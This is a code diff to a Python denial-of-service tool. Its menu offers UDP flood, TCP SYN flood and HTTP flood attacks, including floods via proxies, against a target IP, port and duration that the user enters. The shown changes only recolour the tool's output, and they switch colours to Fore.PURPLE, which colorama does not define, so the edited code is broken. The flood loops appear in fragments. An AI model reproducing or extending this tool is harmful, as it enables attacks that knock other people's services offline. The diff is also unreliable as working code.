@@ -8,7 +8,7 @@ from colorama import Fore, init
 init(autoreset=True)
 
 def banner():
-    print(Fore.RED + r''' 
+    print(Fore.PURPLE + r''' 
       /$$$$$$  /$$$$$$$  /$$$$$$ /$$$$$$$$ /$$$$$$$$
      /$$__  $$| $$__  $$|_  $$_/|_____ $$ |_____ $$ 
     | $$  \__/| $$  \ $$  | $$       /$$/      /$$/ 
@@ -24,7 +24,7 @@ def banner():
 def udp_flood(ip, port, duration):
     timeout = time.time() + duration
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    print(Fore.YELLOW + f"[UDP] Attacking {ip}:{port} for {duration} seconds")
+    print(Fore.PURPLE + f"[UDP] Attacking {ip}:{port} for {duration} seconds")
     while time.time() < timeout:
         try:
             for _ in range(100):
@@ -35,7 +35,7 @@ def udp_flood(ip, port, duration):
 
 def tcp_flood(ip, port, duration):
     timeout = time.time() + duration
-    print(Fore.YELLOW + f"[TCP] Sending SYN to {ip}:{port} for {duration} seconds")
+    print(Fore.PURPLE + f"[TCP] Sending SYN to {ip}:{port} for {duration} seconds")
     while time.time() < timeout:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -84,7 +84,7 @@ def load_proxies(file_path):
 def main():
     banner()
     print(Fore.CYAN + "[1] UDP Flood\n[2] TCP SYN Flood\n[3] HTTP Flood\n[4] HTTP Flood via Proxy")
-    method = input(Fore.YELLOW + "Select attack type >> ")
+    method = input(Fore.PURPLE + "Select attack type >> ")
     target = input("Target IP or URL: ")
     port = int(input("Port (skip for HTTP): ") or 80)
     duration = int(input("Attack duration (seconds): "))
